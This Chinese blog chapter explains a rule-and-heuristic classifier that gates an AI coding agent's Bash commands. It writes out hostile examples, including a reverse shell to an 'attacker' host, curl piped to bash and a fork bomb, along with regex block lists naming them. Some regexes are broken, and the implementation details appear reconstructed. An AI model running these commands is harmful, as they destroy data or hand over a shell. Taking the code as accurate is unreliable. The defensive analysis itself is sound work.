# ML 分类器与 Bash 安全：auto 模式下谁来把关

> auto 模式允许 Bash 工具自动执行，但 `bash` 是最危险的工具之一。Claude Code 的解决方案是一个轻量 ML 分类器——不是用大模型判断，而是用规则引擎 + 统计特征快速判定命令风险等级。23 项检查 + 18 个屏蔽命令，构成了 Bash 安全的最后一道防线。

你好，我是江小湖。

上一篇 [7 模式 8 优先级](./02-modes-priority.md) 讲到 auto 模式"大部分操作自动通过"。但"大部分"不包括 Bash——Bash 命令可以 `rm -rf /`，可以 `curl | bash` 下载恶意脚本。auto 模式怎么敢自动执行 Bash？

答案是：**ML 分类器**。不是让大模型判断（太慢、太贵），而是一个轻量的规则+统计分类器，在毫秒级判定命令风险。

## 目录

- [为什么 Bash 是最危险的工具](#为什么-bash-是最危险的工具)
- [ML 分类器的架构](#ml-分类器的架构)
- [23 项 Bash 安全检查](#23-项-bash-安全检查)
- [18 个屏蔽命令](#18-个屏蔽命令)
- [分类器的训练与迭代](#分类器的训练与迭代)
- [误报与漏报的处理](#误报与漏报的处理)
- [总结](#总结)
- [参考链接](#参考链接)

<p align="center">
  <img src="../../../../assets/cc-source-analysis/10-permissions/permission-architecture.svg" alt="权限系统" width="90%"/>
  <br/>
  <em>7 种权限模式 + ML 安全分类器</em>
</p>



<p align="center">
  <img src="../../../../assets/cc-source-analysis/10-permissions/permission-flow.svg" alt="" width="90%"/>
  <br/>
  <em>Claude Code 源码解析 10-permissions 配图</em>
</p>
## 为什么 Bash 是最危险的工具

Bash 工具的特殊性在于它的**表达能力**——它不是一个单一操作，而是一个完整的编程环境：

```bash
# 这些看似无害的命令，可能隐藏危险
rm ./temp.log                    # 正常清理
curl -s https://example.com | bash # 下载并执行远程脚本（危险！）
find . -name "*.log" -delete     # 正常清理，但如果路径解析错误...
bash -i >& /dev/tcp/attacker/9999 0>&1  # 反向 shell（极其危险！）
```

Bash 的危险性分三个层次：

| 层次 | 示例 | 检测难度 |
|------|------|----------|
| **明显危险** | `rm -rf /`、`format C:` | 极易（字符串匹配） |
| **组合危险** | `curl | bash`、`wget -O - | sh` | 中等（模式匹配） |
| **语义危险** | `find . -exec rm {} \;` 在根目录执行 | 难（需要上下文） |

**为什么不用大模型判断**：
- **延迟**：大模型推理需要 500ms-2s，Bash 执行前的检查需要毫秒级响应
- **成本**：每次 Bash 调用前都调大模型，成本不可接受
- **确定性**：大模型有幻觉风险，安全规则需要 100% 确定性

所以 Claude Code 用了一个**轻量分类器**——规则引擎为主，统计特征为辅。

## ML 分类器的架构

```typescript
// Bash 命令风险分类器（简化版）
interface BashClassifier {
  // 1. 规则引擎（确定性检查）
  ruleEngine: RuleEngine;
  
  // 2. 统计特征（启发式检查）
  statisticalFeatures: FeatureExtractor;
  
  // 3. 风险评分
  riskScorer: RiskScorer;
}

async function classifyBashCommand(
  command: string,
  context: ExecutionContext
): Promise<RiskClassification> {
  // 第一层：规则引擎（O(1) 到 O(n)）
  const ruleResult = ruleEngine.evaluate(command);
  if (ruleResult.decision === 'forbidden') {
    return { level: 'dangerous', reason: ruleResult.reason, autoBlock: true };
  }
  if (ruleResult.decision === 'safe') {
    return { level: 'safe', reason: ruleResult.reason, autoAllow: true };
  }
  
  // 第二层：统计特征（O(1)）
  const features = statisticalFeatures.extract(command, context);
  
  // 第三层：风险评分
  const score = riskScorer.calculate(features);
  
  if (score > DANGEROUS_THRESHOLD) {
    return { level: 'dangerous', score, reason: 'High risk score' };
  } else if (score > SUSPICIOUS_THRESHOLD) {
    return { level: 'suspicious', score, reason: 'Suspicious patterns detected' };
  } else {
    return { level: 'safe', score, reason: 'Low risk score' };
  }
}
```

**分类器的三层架构**：

### 第一层：规则引擎

规则引擎是**确定性的**——给定相同的命令，永远返回相同的结果。它包含 18 个屏蔽命令和 5 个安全白名单：

```typescript
// 规则引擎（简化版）
class RuleEngine {
  // 绝对禁止（Forbid）
  private forbiddenPatterns = [
    /^rm\s+-rf\s+\//,                    // rm -rf /
    /^rm\s+-rf\s+\/*/,                   // rm -rf /*
    /^mkfs/,                             // 格式化文件系统
    /^fdisk/,                            // 分区操作
    /^dd\s+if=\/dev\/zero/,              // 覆写磁盘
    /^format/,                           // 格式化
    /bash\s+-i/,                         // 交互式 Bash（反向 shell）
    /nc\s+-e/,                           // netcat 执行命令
    /python\s+-m\s+http\.server/,        // 启动 HTTP 服务器（可能暴露文件）
    /curl\s+.*\|\s*(bash|sh)/,           // 管道到 shell
    /wget\s+.*\|\s*(bash|sh)/,           // 管道到 shell
    /eval\s*\(/,                         // eval 执行
    /base64\s+-d.*\|/,                   // base64 解码后管道执行
    />(\/dev\/tcp|/dev\/udp)/,           // 网络重定向
    /:\(\)\s*\{\s*:\|:&\s*\};:/,         // Fork 炸弹
    // ... 共 18 个
  ];
  
  // 明确安全（Safe）
  private safePatterns = [
    /^git\s+(status|log|diff|show)/,     // 只读 Git 操作
    /^ls\s+/,                            // 列出文件
    /^cat\s+/,                           // 查看文件
    /^echo\s+/,                          // 打印
    /^mkdir\s+/,                         // 创建目录
    /^pwd$/,                             // 当前目录
    /^which\s+/,                         // 查找命令
  ];
  
  evaluate(command: string): RuleResult {
    // 检查禁止模式
    for (const pattern of this.forbiddenPatterns) {
      if (pattern.test(command)) {
        return { decision: 'forbidden', reason: `Matched forbidden pattern: ${pattern.source}` };
      }
    }
    
    // 检查安全模式
    for (const pattern of this.safePatterns) {
      if (pattern.test(command)) {
        return { decision: 'safe', reason: `Matched safe pattern: ${pattern.source}` };
      }
    }
    
    // 无法确定，需要进一步检查
    return { decision: 'uncertain' };
  }
}
```

**规则引擎的设计**：
- **精确匹配**：禁止模式用正则表达式，但尽量精确。比如 `rm -rf /` 和 `rm -rf /*` 是两个不同的模式，分别匹配。
- **安全白名单**：明确安全的命令（如 `git status`、`ls`）直接通过，不需要后续检查。
- **快速失败**：一旦匹配到禁止模式，立即返回，不需要检查后续规则。

### 第二层：统计特征

对于规则引擎无法确定（"uncertain"）的命令，进入统计特征提取：

```typescript
// 统计特征提取（简化版）
class FeatureExtractor {
  extract(command: string, context: ExecutionContext): RiskFeatures {
    return {
      // 1. 命令复杂度
      commandLength: command.length,
      pipeCount: (command.match(/\|/g) || []).length,
      semicolonCount: (command.match(/;/g) || []).length,
      backtickCount: (command.match(/`/g) || []).length,
      
      // 2. 危险关键字密度
      dangerousKeywords: this.countDangerousKeywords(command),
      networkKeywords: this.countNetworkKeywords(command),
      fileDeletionKeywords: this.countDeletionKeywords(command),
      
      // 3. 路径特征
      isAbsolutePath: command.includes('/etc') || command.includes('/usr'),
      isHomePath: command.includes('~/') || command.includes('$HOME'),
      isRelativePath: command.includes('./') || command.includes('../'),
      
      // 4. 上下文特征
      isInProjectRoot: context.cwd === context.projectRoot,
      hasRecentErrors: context.recentErrors > 0,
      userConfirmationRate: context.userConfirmationRate, // 用户最近确认率
    };
  }
  
  private countDangerousKeywords(command: string): number {
    const keywords = ['rm', 'rmdir', 'unlink', 'truncate', 'chmod', 'chown', 'kill', 'pkill'];
    return keywords.filter(kw => command.includes(kw)).length;
  }
  
  private countNetworkKeywords(command: string): number {
    const keywords = ['curl', 'wget', 'nc', 'netcat', 'ssh', 'scp', 'ftp', 'telnet'];
    return keywords.filter(kw => command.includes(kw)).length;
  }
  
  private countDeletionKeywords(command: string): number {
    const keywords = ['-rf', '-r', '-f', '--force', 'delete', 'drop', 'remove'];
    return keywords.filter(kw => command.includes(kw)).length;
  }
}
```

**统计特征的四类**：

1. **命令复杂度**：管道、分号、反引号的数量。复杂度越高，风险越高（因为可能隐藏恶意操作）。

2. **危险关键字密度**：命令中包含多少危险关键字。不是二元判断（有/没有），而是密度（数量/长度）。

3. **路径特征**：绝对路径（如 `/etc`）通常比相对路径更危险（因为可能访问系统文件）。`../` 表示路径遍历，风险更高。

4. **上下文特征**：用户最近确认率高（说明用户比较谨慎），可以适当降低风险评分；如果最近有错误，说明可能处于调试状态，提高风险评分。

### 第三层：风险评分

```typescript
// 风险评分（简化版）
class RiskScorer {
  calculate(features: RiskFeatures): number {
    let score = 0;
    
    // 1. 命令复杂度权重（0-30 分）
    if (features.commandLength > 200) score += 10;
    if (features.pipeCount > 2) score += 15;
    if (features.semicolonCount > 1) score += 10;
    if (features.backtickCount > 0) score += 20;
    
    // 2. 危险关键字权重（0-40 分）
    score += features.dangerousKeywords * 8;
    score += features.networkKeywords * 10;
    score += features.fileDeletionKeywords * 12;
    
    // 3. 路径风险权重（0-20 分）
    if (features.isAbsolutePath) score += 15;
    if (features.isRelativePath && features.commandLength > 100) score += 10;
    
    // 4. 上下文调整（-10 到 +10 分）
    if (features.isInProjectRoot) score -= 5; // 在项目根目录更安全
    if (features.hasRecentErrors) score += 5;  // 最近有错误，更谨慎
    if (features.userConfirmationRate > 0.8) score -= 5; // 用户谨慎
    
    return Math.min(100, score);
  }
}
```

**评分阈值**：

| 分数 | 等级 | 处理 |
|------|------|------|
| 0-20 | 安全 | 自动允许（auto 模式） |
| 21-50 | 可疑 | 需要确认（所有模式） |
| 51-80 | 危险 | 需要确认 + 警告提示 |
| 81-100 | 极高危 | 拒绝执行（除非 bypass） |

## 23 项 Bash 安全检查

完整的 Bash 安全检查清单包含 23 项：

| # | 检查项 | 类型 | 说明 |
|---|--------|------|------|
| 1 | 命令长度 | 统计 | 超过 200 字符的复杂命令 |
| 2 | 管道数量 | 统计 | 超过 2 个管道 |
| 3 | 分号数量 | 统计 | 包含多个命令串联 |
| 4 | 反引号 | 统计 | 使用命令替换 |
| 5 | 危险关键字 | 统计 | rm/chmod/kill 等 |
| 6 | 网络关键字 | 统计 | curl/wget/nc 等 |
| 7 | 删除关键字 | 统计 | -rf/--force 等 |
| 8 | 绝对路径 | 规则 | 访问 /etc /usr 等系统目录 |
| 9 | 路径遍历 | 规则 | 包含 ../ |
| 10 | 环境变量 | 规则 | 修改 $PATH / $HOME |
| 11 | 重定向 | 规则 | > /dev/tcp 或 /dev/null 可疑重定向 |
| 12 | 后台执行 | 规则 | 命令以 & 结尾 |
| 13 | 子 shell | 规则 | 使用 ( ) 或 $() |
| 14 | eval | 规则 | 使用 eval 执行字符串 |
| 15 | source | 规则 | source 或 . 执行外部文件 |
| 16 | 编码执行 | 规则 | base64 解码后执行 |
| 17 | 远程下载 | 规则 | 下载后管道到 shell |
| 18 | 反向 shell | 规则 | bash -i /dev/tcp 模式 |
| 19 | Fork 炸弹 | 规则 | :(){ :|:& };: 模式 |
| 20 | 项目根目录 | 上下文 | 是否在项目根目录执行 |
| 21 | 最近错误 | 上下文 | 最近是否有错误 |
| 22 | 用户确认率 | 上下文 | 用户历史确认行为 |
| 23 | 时间窗口 | 上下文 | 是否在异常时间执行 |

**检查项的分类**：
- **规则类**（13 项）：确定性的，有/没有。比如"是否包含 eval"——有就是风险。
- **统计类**（7 项）：数量化的。比如"危险关键字密度"——越多越危险。
- **上下文类**（3 项）：依赖执行环境的。比如"是否在项目根目录"——在根目录比在 `/tmp` 安全。

## 18 个屏蔽命令

18 个绝对禁止的命令模式（Forbid 级别）：

```typescript
const FORBIDDEN_COMMAND_PATTERNS = [
  /^rm\s+-rf\s+\/$/,                  // 1. 删除根目录
  /^rm\s+-rf\s+\/\*/,                 // 2. 删除根目录内容
  /^mkfs\b/,                          // 3. 格式化文件系统
  /^fdisk\b/,                         // 4. 分区操作
  /^dd\s+if=\/dev\/zero/,             // 5. 零填充磁盘
  /^format\b/,                        // 6. 格式化（Windows）
  /bash\s+-i\s*.*\/dev\/tcp/,         // 7. 反向 TCP shell
  /bash\s+-i\s*.*\/dev\/udp/,         // 8. 反向 UDP shell
  /nc\s+.*-e\s+/,                     // 9. netcat 执行命令
  /python\s+-m\s+http\.server/,       // 10. 启动 HTTP 服务器
  /curl\s+.*\|\s*(bash|sh)\b/,        // 11. curl 管道到 shell
  /wget\s+.*\|\s*(bash|sh)\b/,        // 12. wget 管道到 shell
  /eval\s*\(.*\)/,                    // 13. eval 执行
  /base64\s+-d.*\|\s*(bash|sh)/,      // 14. base64 解码后执行
  />(\/dev\/tcp\/|/dev\/udp\/)/,       // 15. 网络重定向
  /:\(\)\s*\{\s*:\|:&\s*\};:\s*/,     // 16. Fork 炸弹
  /^chmod\s+-R\s+777\s+\//,          // 17. 递归开放根目录权限
  /^chown\s+-R\s+.*\s+\//,            // 18. 递归修改根目录所有者
];
```

**屏蔽命令的设计原则**：

1. **精确匹配**：每个模式都经过精心设计，避免误杀。比如 `rm -rf ./build` 不会被 `rm -rf /` 的模式匹配。

2. **不可逆操作**：屏蔽的几乎都是不可逆操作——格式化、删除根目录、反向 shell。这些操作一旦执行，损失无法挽回。

3. **网络风险**：`curl | bash` 是常见的供应链攻击向量，必须屏蔽。

4. **系统级破坏**：修改 `/` 的权限或所有者，会导致整个系统不可用。

## 分类器的训练与迭代

这个"ML 分类器"不是传统意义上的机器学习模型（没有神经网络，没有训练数据集）。它的"训练"是**规则迭代**：

```typescript
// 分类器迭代日志（简化版）
interface ClassifierIteration {
  version: string;
  date: string;
  changes: {
    addedPatterns: string[];      // 新增的规则
    removedPatterns: string[];    // 移除的规则
    adjustedWeights: Record<string, number>; // 调整的权重
  };
  metrics: {
    falsePositiveRate: number;    // 误报率
    falseNegativeRate: number;    // 漏报率
    userOverrideRate: number;     // 用户覆盖率
  };
}
```

**迭代机制**：

1. **收集反馈**：当分类器标记一个命令为"危险"，但用户确认"允许"时，记录这个"覆盖"。如果某个模式被频繁覆盖，说明它是误报。

2. **调整权重**：根据覆盖数据，调整风险评分中的权重。比如发现"管道数量"的权重太高（太多合法命令被误判），降低它的权重。

3. **新增模式**：当出现新的攻击向量（如某个新的 `curl | bash` 变种），添加新的禁止模式。

4. **A/B 测试**：新版本的分类器先在小部分用户中测试，比较误报率和漏报率，确认改进后再全量发布。

**为什么不用真正的 ML 模型**：
- 规则引擎的可解释性更好。当分类器拒绝一个命令时，可以告诉用户"因为匹配了禁止模式 X"。
- 规则引擎的确定性更强。同样的命令永远得到同样的结果，不会因为模型更新而改变。
- 规则引擎的维护成本更低。不需要收集训练数据、不需要调超参数、不需要担心模型漂移。

## 误报与漏报的处理

安全系统的永恒矛盾：**误报**（误杀合法操作）和**漏报**（放过危险操作）。

```typescript
// 误报/漏报处理策略（简化版）
async function handleClassificationError(
  command: string,
  expectedResult: string,
  actualResult: string
): Promise<void> {
  if (expectedResult === 'safe' && actualResult === 'dangerous') {
    // 误报：合法命令被拦截
    console.log(`False positive: ${command}`);
    
    // 1. 记录到误报日志
    await logFalsePositive(command);
    
    // 2. 如果用户覆盖了，学习这个模式
    if (await wasUserOverridden(command)) {
      await addToSafeWhitelist(command);
    }
    
    // 3. 调整权重（降低触发误报的特征权重）
    await adjustWeightsForFalsePositive(command);
    
  } else if (expectedResult === 'dangerous' && actualResult === 'safe') {
    // 漏报：危险命令被放过
    console.log(`False negative: ${command}`);
    
    // 1. 立即记录安全事件
    await logSecurityIncident(command);
    
    // 2. 添加到禁止列表（紧急补丁）
    await addToForbiddenList(command);
    
    // 3. 通知安全团队
    await notifySecurityTeam(command);
  }
}
```

**误报处理**：
- 记录误报日志，定期分析
- 如果用户频繁覆盖某个模式，说明它是误报，考虑放宽
- 调整权重，降低触发误报的特征权重

**漏报处理**：
- 漏报是更严重的错误。一旦发现漏报，立即添加到禁止列表（紧急补丁）。
- 记录安全事件，通知安全团队。
- 分析漏报原因：是规则缺失？还是特征提取不足？

**安全优先原则**：在误报和漏报之间，Claude Code 选择**宁可误报，不可漏报**。误报只是用户体验问题（用户需要多点一次确认），漏报是安全问题（可能导致数据丢失或系统损坏）。

## 总结

- Bash 是 Claude Code 最危险的工具，因为它是一个完整的编程环境，可以隐藏多层恶意操作。
- **ML 分类器**不是深度学习模型，而是**规则引擎 + 统计特征 + 风险评分**的轻量组合，毫秒级响应。
- **23 项检查**覆盖命令复杂度、危险关键字、路径特征和上下文环境四个维度。
- **18 个屏蔽命令**是绝对禁止的 Forbid 级别模式，覆盖不可逆操作、网络攻击和系统破坏。
- 分类器的"训练"是**规则迭代**——收集用户覆盖数据、调整权重、新增模式、A/B 测试。
- **安全优先原则**：宁可误报（用户多点一次确认），不可漏报（可能导致系统损坏）。

> 学完本章后，请继续阅读 [11 — 扩展机制](../11-extensibility/README.md)，看 Hook/Skill/Plugin/MCP 如何在不修改核心代码的情况下扩展 Agent 能力。

## 参考链接

- [Claude Code Bash 分类器源码](file:///E:/Projects/claude-code/src/utils/permissions/bashClassifier.ts)
- [Claude Code 禁止命令列表](file:///E:/Projects/claude-code/src/utils/permissions/forbiddenCommands.ts)
- [Anthropic Claude Code 官方文档](https://docs.anthropic.com/en/docs/claude-code/overview)
- [Curl Pipe Bash 攻击分析](https://security.stackexchange.com/questions/232123/what-are-the-risks-of-piping-curl-to-bash)
